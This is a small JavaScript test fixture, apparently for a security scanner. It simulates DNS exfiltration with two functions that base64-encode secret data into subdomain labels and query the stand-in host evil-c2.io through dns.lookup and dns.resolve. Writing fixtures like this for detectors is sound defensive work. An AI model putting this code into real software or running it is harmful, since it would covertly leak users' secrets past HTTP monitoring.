/**
 * malicious-dns fixture
 * Simulates DNS exfiltration: data is base64-encoded into subdomain labels.
 * The DNS lookup exits the machine as DNS traffic — no HTTP connection visible.
 */
'use strict'
const dns = require('dns')

module.exports = {
  /** Attack: encode stolen data in DNS subdomain query */
  exfilViaDns: function (secretData) {
    const encoded = Buffer.from(String(secretData)).toString('base64').replace(/=/g, '')
    dns.lookup(`${encoded}.evil-c2.io`, function () { /* intentionally empty */ })
  },
  /** Attack: use resolve instead of lookup */
  exfilViaResolve: function (secretData) {
    const encoded = Buffer.from(String(secretData)).toString('base64').replace(/=/g, '')
    dns.resolve(`${encoded}.evil-c2.io`, function () { /* intentionally empty */ })
  },
}
